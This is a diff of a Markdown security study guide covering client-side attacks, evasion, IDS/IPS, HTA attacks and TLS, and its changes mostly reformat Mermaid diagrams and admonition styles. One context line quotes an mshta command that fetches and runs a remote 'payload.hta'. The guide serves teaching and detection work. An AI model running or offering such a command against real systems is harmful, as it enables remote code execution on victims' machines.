@@ -61,7 +61,7 @@ Client-side attacks target software applications that process untrusted content:
 ### 1.3 Breakdown of the Client-Side Attack Surface
 
 ```mermaid
-flowchart TD
+flowchart LR
   Client["Client Attack Surface"]
   Client --> Web["Web Browsers: Malicious scripts, drive-by downloads, rogue extensions"]
   Client --> Docs["Documents: Weaponized PDFs, Word macros, Excel formulas"]
@@ -140,7 +140,7 @@ flowchart TD
 Evasion techniques modify the structure or execution profile of a payload to bypass endpoint detection mechanisms:
 
 ```mermaid
-flowchart TD
+flowchart LR
   Evasion["Antivirus Evasion Techniques"]
   Evasion --> Obf["Obfuscation: Dead-code insertion, instruction substitution, string XOR"]
   Evasion --> Pack["Packing: Executable compression wrappers (UPX, custom stubs)"]
@@ -184,7 +184,7 @@ Intrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS) inspect
 ### 4.1 IDS vs. IPS Architectural Comparison
 
 ```mermaid
-flowchart TD
+flowchart LR
   subgraph PassiveIDS ["Intrusion Detection System (IDS)"]
     Traffic1["Network Traffic Stream"] --> Tap["Network TAP / SPAN Port"]
     Tap --> IDS["IDS Sensor Engine"]
@@ -333,7 +333,7 @@ mshta.exe http://192.168.1.50/payload.hta
 ### 6.3 HTA Detection and DFIR Telemetry
 
 ```mermaid
-flowchart TD
+flowchart LR
   Alert["HTA Attack Detection Telemetry"]
   Alert --> T1["Process Lineage: mshta.exe spawning powershell.exe or cmd.exe"]
   Alert --> T2["Command-Line Arguments: mshta.exe referencing external URLs or inline scripts"]
@@ -370,18 +370,18 @@ When the user downloads an executable over plain HTTP, the attacker intercepts t
 ### 7.2 The Role of HTTPS and Authenticated TLS
 
 ```mermaid
-flowchart TD
+flowchart LR
   subgraph InsecureTransport ["Unencrypted HTTP (Vulnerable)"]
     C1["Client"] <-->|"Cleartext Stream (Subject to MITM Tampering)"| Mitm["Attacker"]
     Mitm <-->|"Cleartext Stream"| S1["Server"]
   end
 
   subgraph SecureTransport ["Authenticated HTTPS / TLS (Protected)"]
-    C2["Client"] <===="End-to-End Cryptographic Tunnel (Confidentiality & Integrity)"====> S2["Server (CA Verified)"]
+    C2["Client"] <--"End-to-End Cryptographic Tunnel (Confidentiality & Integrity)"--> S2["Server (CA Verified)"]
   end
 ```
 
-:::important[TLS SECURITY PRINCIPLE]
+:::tip[TLS SECURITY PRINCIPLE]
 **Encryption protects more than secrecy—it prevents undetected modification in transit.** Authenticated TLS ensures:
 1. **Confidentiality:** Eavesdroppers cannot view transmitted data.
 2. **Integrity:** Message Authentication Codes (HMAC) ensure data cannot be altered in transit without invalidating the connection.
@@ -552,7 +552,7 @@ flowchart TD
 | **Application State** | Office operates normally as designed | Application process state is corrupted or hijacked |
 | **Payload Delivery** | Uses legitimate APIs (`WScript.Shell`, `CreateObject`) | Injects raw shellcode via memory corruption |
 
-:::important[EXAM TIP: MACRO VS EXPLOIT DISTINCTION]
+:::tip[EXAM TIP: MACRO VS EXPLOIT DISTINCTION]
 **Macros abuse intended system functionality, whereas exploits abuse flawed system behavior.** Both achieve code execution, but their execution mechanisms and defensive mitigations differ fundamentally.
 :::
 
